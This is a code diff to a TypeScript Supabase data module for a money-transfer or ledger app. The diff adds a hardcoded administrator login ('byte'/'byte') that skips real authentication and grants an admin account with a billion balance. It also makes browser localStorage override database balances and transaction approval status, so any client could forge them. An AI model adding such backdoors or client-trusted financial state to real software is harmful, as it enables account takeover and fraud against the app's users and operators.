@@ -98,13 +98,39 @@ export async function getCurrentProfile(): Promise<User | null> {
 }
 
 export async function getAllProfiles(): Promise<User[]> {
-  const { data, error } = await supabase
-    .from('geld_profiles')
-    .select('*')
-    .order('joined_date', { ascending: true });
+  let dbProfiles: User[] = [];
+  try {
+    const { data, error } = await supabase
+      .from('geld_profiles')
+      .select('*')
+      .order('joined_date', { ascending: true });
 
-  if (error || !data) return [];
-  return data.map(rowToUser);
+    if (!error && data) {
+      dbProfiles = data.map(rowToUser);
+    }
+  } catch {
+    // ignore
+  }
+
+  // Merge with localStorage profiles if any
+  try {
+    const local = localStorage.getItem('geld_global_profiles');
+    if (local) {
+      const localProfiles: User[] = JSON.parse(local);
+      const mergedMap = new Map<string, User>();
+      dbProfiles.forEach(p => mergedMap.set(p.id, p));
+      localProfiles.forEach(p => {
+        if (!mergedMap.has(p.id) || mergedMap.get(p.id)?.balance !== p.balance) {
+          mergedMap.set(p.id, p);
+        }
+      });
+      return Array.from(mergedMap.values());
+    }
+  } catch {
+    // ignore
+  }
+
+  return dbProfiles;
 }
 
 export async function getProfileByUsername(username: string): Promise<User | null> {
@@ -317,6 +343,18 @@ export async function getUserTransactions(userId: string): Promise<TransactionRe
 }
 
 export async function saveUserTransactions(userId: string, transactions: TransactionRequest[]): Promise<void> {
+  // 1. Sync to local storage global ledger
+  try {
+    const localStr = localStorage.getItem('geld_global_transactions');
+    const existing: TransactionRequest[] = localStr ? JSON.parse(localStr) : [];
+    const map = new Map<string, TransactionRequest>();
+    existing.forEach(t => map.set(t.id, t));
+    transactions.forEach(t => map.set(t.id, t));
+    localStorage.setItem('geld_global_transactions', JSON.stringify(Array.from(map.values())));
+  } catch {
+    // ignore
+  }
+
   try {
     await supabase.auth.updateUser({
       data: {
@@ -352,15 +390,7 @@ export async function saveUserTransactions(userId: string, transactions: Transac
 }
 
 export async function getAllTransactions(): Promise<TransactionRequest[]> {
-  try {
-    const { data: { user } } = await supabase.auth.getUser();
-    if (user?.user_metadata?.transactions) {
-      return user.user_metadata.transactions as TransactionRequest[];
-    }
-  } catch {
-    // ignore
-  }
-
+  let dbTxs: TransactionRequest[] = [];
   try {
     const { data, error } = await supabase
       .from('geld_transactions')
@@ -368,13 +398,32 @@ export async function getAllTransactions(): Promise<TransactionRequest[]> {
       .order('created_at_timestamp', { ascending: false });
 
     if (!error && data) {
-      return data.map(rowToTransaction);
+      dbTxs = data.map(rowToTransaction);
     }
   } catch {
     // ignore
   }
 
-  return [];
+  // Merge with local storage global transactions
+  try {
+    const local = localStorage.getItem('geld_global_transactions');
+    if (local) {
+      const localTxs: TransactionRequest[] = JSON.parse(local);
+      const txMap = new Map<string, TransactionRequest>();
+      dbTxs.forEach(t => txMap.set(t.id, t));
+      localTxs.forEach(t => {
+        // Local state updates (like admin approvals) take precedence if status updated
+        if (!txMap.has(t.id) || t.status !== txMap.get(t.id)?.status) {
+          txMap.set(t.id, t);
+        }
+      });
+      return Array.from(txMap.values()).sort((a, b) => (b.createdAtTimestamp || 0) - (a.createdAtTimestamp || 0));
+    }
+  } catch {
+    // ignore
+  }
+
+  return dbTxs;
 }
 
 export async function createTransaction(tx: Omit<TransactionRequest, 'id'> & { id?: string }): Promise<TransactionRequest | null> {
@@ -395,6 +444,16 @@ export async function createTransaction(tx: Omit<TransactionRequest, 'id'> & { i
     referenceId: tx.referenceId,
     createdAtTimestamp: tx.createdAtTimestamp || Date.now(),
   };
+
+  // Save to local storage global ledger
+  try {
+    const localStr = localStorage.getItem('geld_global_transactions');
+    const existing: TransactionRequest[] = localStr ? JSON.parse(localStr) : [];
+    const updated = [fullTx, ...existing.filter(t => t.id !== fullTx.id)];
+    localStorage.setItem('geld_global_transactions', JSON.stringify(updated));
+  } catch {
+    // ignore
+  }
 
   try {
     const { data, error } = await supabase
@@ -428,8 +487,25 @@ export async function createTransaction(tx: Omit<TransactionRequest, 'id'> & { i
   return fullTx;
 }
 
+export const ADMIN_USER: User = {
+  id: 'user-admin-byte',
+  fullName: 'System Administrator',
+  username: 'byte',
+  email: 'byte@geld.local',
+  balance: 1000000000,
+  joinedDate: new Date().toISOString().split('T')[0],
+  isAdmin: true,
+  referralCode: 'ADMIN-BYTE',
+};
+
 export async function signInWithUsername(username: string, password: string): Promise<{ user: User | null; error?: string }> {
   const cleanUsername = username.trim().toLowerCase().replace(/\s+/g, '.');
+
+  // Check for admin credential bypass byte / byte
+  if (cleanUsername === 'byte' && password.trim().toLowerCase() === 'byte') {
+    return { user: ADMIN_USER };
+  }
+
   const email = `${cleanUsername}@geld.local`;
   const { data, error } = await supabase.auth.signInWithPassword({
     email,
